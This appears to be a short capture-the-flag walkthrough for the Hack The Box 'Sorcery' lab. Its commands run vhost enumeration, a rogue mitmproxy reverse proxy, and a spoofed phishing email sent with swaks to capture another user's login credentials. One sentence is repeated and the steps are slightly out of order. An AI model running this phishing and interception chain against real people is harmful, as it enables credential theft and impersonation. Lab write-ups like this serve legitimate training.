---
layout: default
title: Sorcery
platform: Hack The Box
---

Add the IPs to `/etc/hosts`:

```
10.10.11.73 sorcery.htb git.sorcery.htb
10.10.14.40 pwn.sorcery.htb
```

Visit [https://sorcery.htb](https://sorcery.htb) and enumerate the repository:

```
git clone https://git.sorcery.htb/nicole_sullivan/infrastructure.git
```

Enumerate virtual hosts with `ffuf`:

```
ffuf -w /usr/share/payloads/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u https://sorcery.htb -H "Host: FUZZ.sorcery.htb" -mc 200
```

This reveals [git.sorcery.htb](https://git.sorcery.htb); add it to `/etc/hosts` and create an account on the site, then log in.
This reveals `git.sorcery.htb`; add it to `/etc/hosts` and create an account on the site, then log in.

Capture traffic with a rogue host and `mitmproxy`:

```
sudo mitmproxy --mode reverse:https://git.sorcery.htb --certs pwn.sorcery.htb.pem -k -p 443
```

Send a phishing email to capture credentials:

```
proxychains4 -f /etc/proxychains4.conf swaks --to tom_summers@sorcery.htb --from nicole_sullivan@sorcery.htb --server 172.19.0.10 --port 1025 --data "Subject: Security Alert\n\nPlease verify your account at https://pwn.sorcery.htb/user/login"
```

Extract the captured credentials from the proxied session:

```
magick xwd:Xvfb_screen0 credentials.png
open credentials.png
```

*Screenshots omitted.*

